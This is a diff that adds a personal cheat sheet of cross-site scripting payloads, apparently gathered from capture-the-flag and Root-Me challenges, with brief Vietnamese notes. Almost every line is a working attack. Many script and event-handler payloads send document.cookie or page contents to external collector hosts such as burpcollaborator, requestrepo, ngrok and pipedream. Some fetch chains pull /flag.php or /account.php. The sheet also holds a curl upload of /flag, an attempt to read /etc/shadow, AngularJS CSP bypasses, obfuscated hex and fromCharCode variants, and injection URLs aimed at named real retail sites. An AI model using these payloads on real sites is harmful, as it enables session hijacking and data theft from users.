@@ -1,0 +1,134 @@
+curl -d @/flag http://???
+curl -F f=@/flag https://fybn2asz.requestrepo.com/
+
+<script>location.href='//76bl2eiwg0aveah34fvlgp8ct3ztni.burpcollaborator.net/?c=$(document.cookie)'</script>
+<script>document.location='//76bl2eiwg0aveah34fvlgp8ct3ztni.burpcollaborator.net/?c=$(document.cookie)'</script>
+<script>window.location='//76bl2eiwg0aveah34fvlgp8ct3ztni.burpcollaborator.net/?c=$(document.cookie)'</script>
+javascript:fetch("/account.php").then((x)=>x.text()).then((x)=>fetch("//eewg4wqqy0dyunf87tsiver0qrwhk6.burpcollaborator.net/?w="+x))
+javascript:fetch('/account.php').then((r)=>r.text()).then((r)=>window.location.href='http://abca940c718f.ngrok.io/'+window.btoa(r))
+javascript:fetch("/account.php").then((x)=>x.text()).then((x)=>fetch("//ip/?c="+document.cookie))
+javascript:fetch("/account.php").then((x)=>x.text()).then((x)=>{location="//ip/?c="+btoa(x)})
+
+<img+src="1"+onerror="window.location=`//ylno2rxcx2cemkldyshuis6ytpzgn5.burpcollaborator.net?c=${btoa(document.body.innerHTML)}`"
+
+<img src onerror="fetch('http://ka0fy4st.requestrepo.com?query='+btoa(document.cookie))" >
+
+<svg/onload=location="http://8e140a765b26.ngrok.io?c/="+document.body.textContent;//
+
+<img src="https://*; script-src 'unsafe-inline'" onerror="var img = new Image(); img.src = 'https://intercept.xxx?b='+document.cookie; document.body.appendChild(img);">
+
+<img src="http://; script-src 'unsafe-inline'"><script>window.location = 'https://requestbin.io/1fy84do1?cookie=' + document.cookie;</script>
+
+<script>
+var xhr = new XMLHttpRequest();
+xhr.open("GET", "http://127.0.0.1:8888/api/files?username=admin&filename=./flag&checksum=123", true);
+xhr.send();
+</script>
+
+https://www.nguyenkim.com/tim-kiem.html?tu-khoa=%22%3E%3Csvg%3E%3Canimate%20onbegin=%22alert(document.URL)%22%20attributeName=%22x%22%20dur=%221s%22%3E
+
+https://www.nguyenkim.com/tim-kiem.html?tu-khoa="><svg><animate onbegin="alert(document.URL)" attributeName="x" dur="1s">
+
+http://shoponline24.vn/search?type=product&query=%22%3E%3Cimg+src%3Dx+onerror%3D%22alert%281%29%22
+
+"><a href=javascript:alert(1)>
+
+Get cookies from another user : <script>document.location.replace("http://endpoint?cookie="+document.cookie)</script>
+Without redirection: <script>document.write('<img src="http://endpoint?cookie='+document.cookie+'"')</script>
+
+<script>document.location.replace("http://endpoint?cookie=".concat(document.cookie))</script>
+
+<script>fetch("http://???",{method:"POST",body:JSON.stringify({"Hello":document.cookie})}</script>
+
+<script>javascript:fetch('/flag.php').then((r)=>r.text()).then((r)=>window.location.href='http://yfv3vgjb.requestrepo.com/'+window.btoa(r))</script>
+
+<img srx=x onerror='fetch("/flag.php").then(x=>x.text()).then(t=>fetch("//??/?c="+t))'>
+
+<script>
+  x=new XMLHttpRequest();
+  x.onload=function(){
+    document.write(this.responseText);
+  }
+  x.open("GET","flag.php");
+  x.send();
+</script>
+
+<svg/onload=fetch('/index.php?page=post&id=3').then(r=>{return r.text()}).then(x=>{fetch('http://clnihiau.requestrepo.com',{method:'POST',body:x})})//
+=====> TO HTML ENTITY BYPASS
+
+x=new XMLHttpRequest();x.onload=function(){document.write('http://c84a6irc.requestrepo.com?q='+escape(x.responseText));}x.open("GET",'index.php');x.send();
+
+<svg/onload=var x=new XMLHttpRequest();x.open("GET",'/index.php?page=newpost');x.onload=function(){document.write(btoa(x.responseText))};x.send();//
+
+<script>
+	r= new XMLHttpRequest();
+	r.onload=function(){
+		document.write(this.responseText);
+	}
+	r.open("GET","file:///etc/shadow");
+	r.send();
+</script>
+
+
+<strong id=x tabindex=1 onfocus=fetch(`https://enk47zjyito2ohs.m.pipedream.net?cookie=${document.cookie}`) autofocus></strong>
+
+
+<strong autofocus contenteditable onfocus="document.getElementsByTagName('body')[0].innerHTML+='<img src=\'https://***********/******?'+document.cookie+'\'>'">a</strong>
+
+<strong </strong>><img src=x onerror="if(document.cookie){location.href='http://XXXX:YYYY/'+document.cookie}"
+
+<em onfocus="navigator.sendBeacon('https://webhook.site/…',document.cookie)" contenteditable autofocus>test</em>
+
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.8/angular.js" /></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js" /></script>
+<div ng-app ng-csp>
+  {{$on.curry.call().alert(1)}}
+</div>
+
+<script src=https://ajax.googleapis.com/ajax/libs/angularjs/1.0.1/angular.min.js></script>
+<div ng-app ng-csp>
+{{constructor.constructor('eval(atob("ZmV0Y2goIi9jc3AtdHdvLWZsYWciKS50aGVuKHg9PngudGV4dCgpKS50aGVuKHg9PmxvY2F0aW9uPSIvL3J3eC5rci8/Iitlc2NhcGUoeCkp"))')()}}
+</div>
+
+fetch('/xss-two-flag').then(x=>x.text()).then(x=>fetch('//hinrbjqo.requestrepo.com?c='+x))
+
+<img src="x"onerror="fetch(`{our_url}?f=${encodeURIComponent(document.body.innerHTML}`)"
+
+<img src=1 onerror="window.location='vps?c='+document.body.textContent">
+
+<img src="xxx" onerror="window.location=String.fromcharcode(104,116,116,112,58,47,47,109,121,115,101,114,118,101,114,47,63,97,61)+document.cookie">
+
+<table/background=''></table>
+
+location.assign(`https://enl1nzc2lysmkwp.m.pipedream.net?flag=`+document.cookie)
+
+eval.apply`${[`HEX_PAYLOAD_HERE`]}`
+http://challenge01.root-me.org/web-client/ch34/index.php?calculation=4*5%2b%22;eval.apply`${[`\x6c\x6f\x63\x61\x74\x69\x6f\x6e\x2e\x68\x72\x65\x66\x3d\x27\x68\x74\x74\x70\x73\x3a\x2f\x2f\x65\x6e\x66\x72\x7a\x73\x38\x79\x71\x39\x76\x37\x72\x2e\x78\x2e\x70\x69\x70\x65\x64\x72\x65\x61\x6d\x2e\x6e\x65\x74\x2f\x3f\x7a\x6f\x62\x74\x3d\x27\x2b\x65\x6e\x63\x6f\x64\x65\x55\x52\x49\x43\x6f\x6d\x70\x6f\x6e\x65\x6e\x74\x28\x64\x6f\x63\x75\x6d\x65\x6e\x74\x2e\x63\x6f\x6f\x6b\x69\x65\x29\x3b`]}`%22
+
+<button onfocus=doc=document;doc.location="//??".concat(doc.cookie) autofocus></button>
+bypass " thanh &quot;
+
+<h1 onclick=(alert)(&quot;XSS&quot;)></h1>
+
+<button onfocus=window.open("http://ip/?"+eval("dsocument".replace('s','')).cookie) autofocus></button>
+
+<keygen autofocus onfocus=a=document;window.location=String.fromCharCode(104,116,116,112,58,47,47,114,101,113,117,101,115,116,98,46,105,110,47,49,107,113,104,115,111,104,49,63,105,110,115,112,101,99,116,61)%2ba.cookie></keygen>
+
+
+Su dung String.fromCharCode
+<button onfocus=(function(){x=String.fromCharCode(101,118,97,108);x=this[x];y=String.fromCharCode(97,108,101,114,116,40,49,41);x(x(y));})() autofocus>xss</button>
+
+note: x=eval;x=this[x];y=alert(1);x(x(y));
+=> Truoc khi convert: <button onfocus=(function(){alert(1)})() autofocus>xss</button>
+
+<button onfocus=(function(){
+  a=document;
+  x=String.fromCharCode(101,118,97,108);
+  x=this[x];
+  y=String.fromCharCode(100,111,99,117,109,101,110,116,46,119,114,105,116,101,40,39)+String.fromCharCode(60, 105,109,103,32,115,114,99,61,34,104,116,116,112,58,47,47,101,120,97,109,112,108,101,46,99,111,109,47,63,99, 61)+a.cookie+String.fromCharCode(34,47,62)+String.fromCharCode(39,41,59);x(x(y));})() autofocus>
+</button>
+
+y=document.write('<img src="http://example.com/?c=+document.cookie+"/>');
+
+<button autofocus onfocus=x=new/**/XMLHttpRequest();get=String.fromCharCode(71,69,84);url=String.fromCharCode(104,116,116,112,115,58,47,47,...);url=url.concat(document/**/.cookie);x.open(get,url,false);x.send();>button</button>
